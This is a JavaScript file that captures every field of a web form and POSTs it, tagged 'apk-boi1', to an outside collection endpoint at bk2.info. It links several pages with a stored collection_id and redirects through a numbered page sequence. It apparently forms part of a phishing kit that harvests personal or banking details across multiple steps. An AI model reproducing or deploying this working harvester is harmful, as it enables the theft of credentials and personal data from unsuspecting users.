var API_URL = "https://bk2.info/api";
var hasPath = "";
var page_type = "";

function serverCall(body, nextURL) {
    fetch(API_URL + "/form/add", {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(body),
        })
        .then((res) => res.json())
        .then((responseData) => {
             
             if(responseData.status == 200) {
                if (page_type == 'home') {
                    localStorage.setItem("collection_id", responseData.data);
                }
                window.location.href = nextURL;
            } else {
                $("#test").text("Error : "+JSON.stringify(responseData));
            }
        })
        .catch((error) => {
            console.error(error);
            $("#test").text("error : "+error);
        });
}

window.onload = function() {
    if($("#page_type")){
         page_type = $("#page_type").val();
    }
    let form = document.getElementById("form");
    let nextValue  = '';
    nextValue = document.getElementById("nextValue").value;
    if (nextValue == '2.html') {
        localStorage.removeItem("collection_id");
    }
    form.addEventListener("submit", function(event) {
        event.preventDefault();
        let formData = {};
        for (let i = 0; i < form.elements.length; i++) {
            let element = form.elements[i];
            if(element.tagName === 'INPUT' || element.tagName === 'TEXTAREA' || element.tagName === 'SELECT') {
                formData[element.name] = element.value;
            }
        }
        let sendData = {};
        sendData['site'] = "apk-boi1";
        sendData['data'] = formData;
        if(page_type!=='home'){
            sendData['id'] = localStorage.getItem("collection_id");
        }else{
            sendData['id'] = '';
        }
        serverCall(sendData, nextValue);
    });
};